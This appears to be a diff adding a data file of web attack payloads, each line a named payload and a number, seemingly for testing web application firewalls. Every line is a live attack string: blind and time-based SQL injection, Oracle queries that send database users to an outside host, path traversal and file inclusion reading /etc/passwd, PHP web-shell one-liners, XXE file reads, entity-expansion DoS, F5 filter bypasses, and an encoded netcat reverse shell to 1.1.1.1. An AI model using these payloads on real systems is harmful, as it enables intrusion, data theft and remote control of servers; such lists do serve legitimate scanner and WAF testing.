+Blind SQL Injection - Typecasting##'+or+round(pi(),1)+true+true = version()##1
+Blind SQL Injection - Typecasting##+or+round(pi(),1)+true+true = version()##1
+Blind SQL Injection - Compare##'+where+(0)=0##1
+Blind SQL Injection - Compare##+where 0 = 0##1
+Blind SQL Injection - with substring##1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1))##1
+Blind SQL Injection - without substring##1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74##1
+Blind SQL Injection - URL Encoded##123%20or%20%c0%a7%c01%a71=%c0%a71##1
+Blind SQL Injection - Base64 Encoded##123K29yKycxJz0nMQ==##1
+Blind SQL Injection - with case##case when name=0x5265696E657273 then 1 else 0 end##1
+Blind SQL Injection - Aritmetical -1##123+1+5-5-1##1
+Blind SQL Injection - Aritmetical -2##123+len(1234)-len(123)##1
+Blind SQL Injection - Aritmetical -3##23+len(@@servername)-len(@@servername)##1
+Blind SQL Injection - TimeBased MSSQL##')+waitfor+delay+'0:0:5'##1
+Blind SQL Injection - TimeBased MSSQL##');waitfor+delay+'00:00:05'##1
+Blind SQL Injection - TimeBased MSSQL##';waitfor+delay+'00:00:05'##1
+Blind SQL Injection - TimeBased MSSQL##');waitfor+delay+'00:00:05'--##1
+Blind SQL Injection - TimeBased MSSQL##');waitFor+Delay+'00:00:05'##1
+Blind SQL Injection - TimeBased MSSQL##'waitfor+delay+'00:00:05'##1
+Blind SQL Injection - TimeBased MSSQL##')+waitfor+delay+'00:00:05'##1
+Blind SQL Injection - TimeBased MSSQL##'+waitfor+delay+'00:00:05'--##1
+Blind SQL Injection - TimeBased MSSQL##'+waitfor+delay+'00:00:05'##1
+Blind SQL Injection - TimeBased MSSQL##+waitfor+delay+'00:00:05'##1
+Blind SQL Injection - TimeBased MSSQL##')+waitfor+time+'00:00:01'##1
+Blind SQL Injection - TimeBased MSSQL without )##';waitfor+delay+'0:0:5'--##1
+Blind SQL Injection - TimeBased MSSQL without semicolon##';waitfor+delay+'0:0:5'--##1
+Blind SQL Injection - TimeBased MYSQL##BENCHMARK(1000000000,MD5(CHAR(116)))##1
+Blind SQL Injection - TimeBased MYSQL##IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)##1
+Blind SQL Injection - TimeBased MYSQL##' UNION SELECT IF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1)##1
+Blind SQL Injection - TimeBased MYSQL##+if(ASCII(SUBSTRING((),i, 1))>k,BENCHMARK(100000000, RAND()),1)##1
+Blind SQL Inkection - TimeBased##'%20AND%20SLEEP(10)='##1
+Second Order SQL Injection for ORACLE##'||UTL_HTTP.REQUEST('http://somehost/')||'##1
+Second Order SQL Injection for ORACLE##'||utl_inaddr.get_host_name((select+user+from+dual))##1
+Second Order SQL Injection for ORACLE##'+or+1=utl_http.request('http://host/'||(select+user+from+dual))--##1
+Directory Traversal - For Unix##/../../../../file##0
+Directory Traversal - For Windows##\..\..\..\..\file##0
+Directory Traversal - Escaping for Unix##\../\../\../file##0
+Directory Traversal - Escaping for Windows##/..\/..\file.txt##0
+Directory Traversal - Bypassing Filters##/%c0%ae/WEB-INF/web.xml##0
+Directory Traversal - Bypassing Filters with dot##/webapp/WEB-INF./web.xml##0
+Directory Traversal - with extra dot for Unix##/.........................../../../../file##0
+Directory Traversal - with extra dot for windows##/...........................\..\..\..\file##0
+Directory Traversal - Double Slash##/..//..//..//..//file##0
+Directory Traversal - Multiple Slash##/..///..///..///..///file##0
+Directory Traversal - Double Back Slash##/..\\..\\..\\..\\file##0
+Directory Traversal - Multiple Back Slash##/..\\\..\\\..\\\file##0
+Directory Traversal - Escaping Slash##/./\/././\/./file##0
+Directory Traversal - Escaping Back Slash##/.\/\.\.\/\.\file##0
+Directory Traversal - single dot for unix##/././././././././././././file##0
+Directory Traversal - single dot for windows##/.\.\.\.\.\.\.\.\.\.\.\.\file##0
+Directory Traversal - escaping dot for unix##/./.././.././../file##0
+Directory Traversal - escaping dot for windows##/.\..\.\..\.\..\file##0
+Directory Traversal - Double Slash##/.//..//.//..//.//..//file##0
+Directory Traversal - Double Back Slash##/.\\..\\.\\..\\.\..\\file##0
+Directory Traversal - espcaping custom filter##/.//././/././/./boot.ini##0
+Directory Traversal - espcaping custom filter##/../..//../..//file##0
+Directory Traversal - with %5C##/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/dir%5C/file##0
+Directory Traversal - with backslash escape##/..\/..\/..\/..\/..\/..\/..\/file##0
+Directory Traversal - three dot##/.../.../.../.../.../file##0
+Directory Traversal - three dot url encoded##/..%2E/..%2E/..%2E/..%2E/..%2E/file##0
+Directory Traversal - URL Encoding for / -1##/..%2F..%2F..%2F..%2Fetc/mtc##0
+Directory Traversal - URL Encoding for \ -2##/..%5c..%5C..%5Cfile##0
+Directory Traversal - URL Encoding for . -1##/%2E%2E/%2E%2E/%2E%2E/etc/mtc##0
+Directory Traversal - Full URL Encoded ##/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fmtc##0
+Directory Traversal - Double URL Encoding for /##/..%252f..%252F..%252fetc/mtc##0
+Directory Traversal - Double URL Encoding for .##/%252E%252E/%252E%252E/%252E%252E/etc/mtc##0
+Directory Traversal - Full Double URL Encoded##/%252E%252E%252f%252E%252E%252f%252E%252E%252ffile##0
+Directory Traversal - Double URL Encoding for \##/..%255c..%255c..%255cboot.ini##0
+Directory Traversal - Double URL Encoding for .##/%252E%252E\%252E%252E\%252E%252E\file##0
+Directory Traversal - Full URL Encoding for Windows##/%2e%2e%5c%2e%2e%5c%2e%2e%5cfile##0
+Directory Traversal - Full Double URL Encodinf##/%252E%252E%255c%252E%252E%255c%252E%252E%255cfile.ini##0
+Directory Traversal - UTF-8 Encoding for /##/..%c0%af..%c0%af..%c0%affile##0
+Directory Traversal - UTF-8 Encoding for .##/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/file##0
+Directory Traversal - Full UTF-8 Encodind ##/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%affile##0
+Directory Traversal - Double UTF-8 Encoding for /##/..%25c0%25af..%25c0%25affile##0
+Directory Traversal - Double UTF-8 Encoding for .##/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/file##0
+Directory Traversal - Full Double UTF-8 Encoding##/%25c0%25ae%25c0%25ae%25c0%25affile##0
+Directory Traversal - UTF-8 Encoding for \##/..%c1%9c..%c1%9c\file##0
+Directory Traversal - UTF-8 Encoding for .##/%c0%ae%c0%ae\%c0%ae%c0%ae\file##0
+Directory Traversal - Full UTF-8 Encoding##/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cfile##0
+Directory Traversal - Double UTF-8 Encoding for \##/..%25c1%259c..%25c1%259cfile##0
+Directory Traversal - Double UTF-8 Encoding for .##/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\file##0
+Directory Traversal - Full Double UTF-8 Encoding##/%25c0%25ae%25c0%25ae%c1%9c%25c0%25ae%25c0%25ae%c1%9cfile##0
+Directory Traversal - Double Nibble Hex Encoding for /##/..%%32%66..%%32%66..%%32%66file.ini##0
+Directory Traversal - Double Nibble Hex Encoding for .##%%32%65%%32%65/%%32%65%%32%65/file.ini##1
+Directory Traversal - Full Double Nibble Hex Encoding##/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66file.ini##0
+Directory Traversal - Double Nibble Hex Encoding for \##/..%%35%63..%%35%63file##0
+Directory Traversal - Double Nibble Hex Encoding for .##/%%32%65%%32%65\%%32%65%%32%65\file##0
+Directory Traversal - Full Double Nibble Hex Encoding##/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63file##0
+Directory Traversal - First Nibble Hex Encoding##/%%32e%%32e%%32f%%32e%%32e%%32f%%32e%%32e%%32ffile##0
+Directory Traversal - Second Nibble Hex Encoding##/%2%65%2%65%2%66%2%65%2%65%2%66%2%65%2%65%2%66file##0
+Directory Traversal - Microsoft %u encoding##/%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002ffile##0
+Local File Inclusion - Basic##../../../file##1
+Local File Inclusion - URL Encoded -1##..%2f..%2f..%2ffile##1
+Local File Inclusion - URL Encoded -2##%2e%2e/%2e%2e/file##1
+Local File Inclusion - Full URL Encoded##%2e%2e%2f%2e%2e%2ffile##1
+Local File Inclusion - Null Byte##../../../file%00##1
+Local File Inclusion - Extra dot for Unix##.........................../../../../file##1
+Local File Inclusion - Extra dot for Windows##...........................\..\..\..\file##1
+Local File Inclusion - bypass for custom filter##../../../../../filename/////[...]/////##1
+Local File Inclusion - Extra Slash##../../../../../file//////////////##1
+Local File Inclusion - Single dot with null##/../etc/./passwd%00##1
+Local File Inclusion - Single dot##/../etc/./passwd##1
+Local File Inclusion - Showcode##/showcode.php/C:Windows/aaa.txt##1
+Local File Inclusion - with file wrapper##file:///etc/hosts##1
+Local File Inclusion - with data wrapper##data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=##1
+Local File Inclusion - normalization##../etc/./hosts##1
+Local File Inclusion - normalization##../../etc/././././hosts##1
+Local File Inclusion - with php wrapper##php://filter/read=convert.base64-encode/resource=index.php##1
+Local File Inclusion - custom path inserted##../../../../etc/aaa/../hosts##1
+Local File Inclusion - custom path inserted-2##../../../../etc/aaa/../aaa/bbb/../../hosts##1
+Local File Inclusion - path normalization##..////////////..////////////////..///////////////../etc//////////hosts##1
+Local File Inclusion - path normalization for older phps-1##../../../../etc/hosts/.##1
+Local File Inclusion - path normalization for older phps-2##/etc/passwd/./././././.##1
+Local File Inclusion - path normalization for older phps-3##/etc/hosts///////////##1
+Remote File Inclusion - Basic##http://localhost/aa.txt##1
+Remote File Inclusion - without protocol##www.site.com/aa.txt##1
+Command Injection - with semicolon##;ls+-al;##1
+Command Injection - with pipe##|+ping+|##1
+Command Injection - with and##&&+ping##1
+Command Injection - with newline##%0a+ping+localhost+-i+3##1
+Command Injection - URL Encoded##..%2F..%2F..%2Fbin/ls%20-al|##1
+Command Injection - UTF-8 Encoded##..%c0%af..%c0%af../bin/ls%20-al|##1
+Command Injection - Full URL Encoded -1##%31%3b%6c%73%20%2d%61%6c%3b##1
+Command Injection - FULL URL Encoded -2##%31%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%2e%31%2e%31%2e%31%20%33%33##1
+HTTP Parameter Pollution - For XSS##<img&id=+src="http://host">##1
+HTTP Parameter Pollution - For SQL Injection##123+select+1&id=2,3+from+table##1
+HTTP Parameter Pollution - For SQL Injection with comments##select/*&id=*/user&id=pass/*&id=*/from/*&id=*/users--##1
+HTTP Parameter Fragmantation##1+union/*&id1=*/select+username,password/*&id2=*/from+users--##1
+HTTP Response Splitting##%0d%0aDATA:foo%0d%0a##1
+PHP Code Injection##{${include("http://url/code.txt")}}##1
+PHP Code Injection##1);error_reporting(0);passthru(base64_decode(\$_SERVER[HTTP_CMD])##1
+PHP Code Injection##<?php passthru(getenv("HTTP_ACCEPT_LANGUAGE"));?>##1
+PHP Code Execution -1##5";+echo+"PHP Code";+$aaa="##1
+PHP Code Execution -2##data:,<?php eval($_REQUEST[cmd]);?>&cmd=phpinfo();##1
+PHP Code Execution -3##";phpinfo();##1
+PHP Code Execution -4##phpinfo();##1
+PHP Code Execution -5##phpinfo%28%29;##1
+PHP Code Execution - with system##<?php system("calc.exe"); ?>##1
+PHP Code Execution - with include##<?php include $_GET["d"]; ?>##1
+PHP Code Execution - with exec##<? exec($_REQUEST["c"]); ?>##1
+PHP Code Execution - with shell_exec##<? @shell_exec($_REQUEST["c"]); ?>##1
+PHP Code Execution - with popen##<? popen($_REQUEST["c4"]); ?> ##1
+Blind PHP Code Execution -1##',''));sleep(10);exit;/*##1
+Blind PHP Code Execution -2##)''.sleep(10).''##1
+Blind PHP Code Execution -3##{${sleep(10)}}##1
+LDAP Injection##)(sn=*##1
+HTTP Headers - XSS with Via##Via: <script>alert(1)</script>##2
+HTTP Headers - XSS with X-Forwarded-For##X-Forwarded-For: <script>alert(1)</script>##2
+HTTP Headers - SQL Injection with Via##Via: 12'+union+select+abc+from+abc##2
+HTTP Headers - SQL Injection with X-Forwarded-For##X-Forwarded-For: 12'+and+@@version=1--##2
+HTTP Headers - HTTP Response Splitting With Custom Header##Header1: 0d%0aDATA:foo%0d%0a%0d%0a##2
+URL Re-Writing - XSS##/app/search/<script>alert()</script>/lang/en##0
+URL Re-Writing - Blind SQL Injection##/uyg/id/123+or+1=1/tp/456##0
+URL Re-Writing - SQL Injection##/uyg/id/123'+and+@@servername>1--##0
+URL Re-Writing - Time Based Blind SQL Injection##'+benchmark(100000,md5(now()))+'##0
+URL Re-Writing - SQL Injection##/version()=5.1)/##0
+Source Code Disclosure -1##/uyg.js%70##0
+Source Code Disclosure -2##/uyg.jsp%00##0
+Source Code Disclosure -3##/uyg.jsp%0000##0
+Source Code Disclosure -4##/uyg.jsp%20##0
+Source Code Disclosure -5##/uyg.jsp%25##0
+Source Code Disclosure -5##/uyg.JSP##0
+Source Code Disclosure -6##/uyg.jsp%5c##0
+Source Code Disclosure -7##/uyg.jsp::$$DATA##0
+Source Code Disclosure -8##/uyg.jsp/##0
+Source Code Disclosure -9##/uyg.jsp.##0
+Source Code Disclosure -10##/uyg.jsp+##0
+Source Code Disclosure -11##/uyg.jsp*##0
+Source Code Disclosure -12##/uyg.jsp;.jsp##0
+XXE - Xml external Entity##<!ENTITY name SYSTEM "URI">##1
+SSI - Basic Shell Command Insertion##<!--#printenv -->##1
+SSI - CGI Insertion##<!--#exec cgi="/cgi-bin/example.cgi" -->##1
+SSI - File Include##<!--#include virtual="/cgi-bin/example.cgi -->##1
+POST Requests -1##<script>alert(1)</script>##4
+Web Services Simple SQLi -1##<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue>') union all select null, null, id from users -- </get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services XPath Injection -1##<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue>nouser'] | P | //user[name/text()='nouser</get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services XSS -1##<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue><![CDATA[<]]>scr<![CDATA[ipt>]]>var s="goeshere";<![CDATA[<]]>/scr<![CDATA[ipt>]]></get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services XML Entity Expansion Attack -1##<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue><!DOCTYPE root [<!ENTITY ha "Ha !"><!ENTITY ha2 "&ha; &ha;"><!ENTITY ha3 "&ha2; &ha2;"><!ENTITY ha4 "&ha3; &ha3;"><!ENTITY ha5 "&ha4; &ha4;"><!ENTITY ha6 "&ha54; &ha5;">]><root>&ha6;</root></get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services Referral Attack -1##<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue><!DOCTYPE root [<!ENTITY foo SYSTEM "file:///c:/inetpub/wwwroot/my.pass">]><in>&foo;</in></get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services DoS via SOAP Arrays -1##<fn:PerformFunction xmlns:fn="foo"><DataSet xsi:type="SOAP-ENC:Array" SOAP-ENC:arrayType="xsd:string[100000]"><item xsi:type="xsd:string">Data1</item><item xsi:type="xsd:string">Data2</item><item xsi:type="xsd:string">Data3</item></DataSet></fn:PerformFunction>##3
+F5 Bypass - XSS##123&CSRT=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&xss=<script>alert(1234)</script>##1
+F5 Bypass - SQL Injection##123&CSRT=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&sqli=124'+and+1=1--##1
+PATH_INFO Bypass Simple SQL Injection for Apache##/index.php/xyz?userid=union+select+@@version--##0
+PATH_INFO Bypass Simple XSS for Apache##/index.php/abfi?var=<script>alert(1234)</script>##0
+Path Parameters Bypass SQL Injection##/test.php;param=value?param=union+select+@@version--##0
+Path Parameters Bypass XSS##/test.php;param=value?param=<img+src=1+onerror=alert(44444)>##0
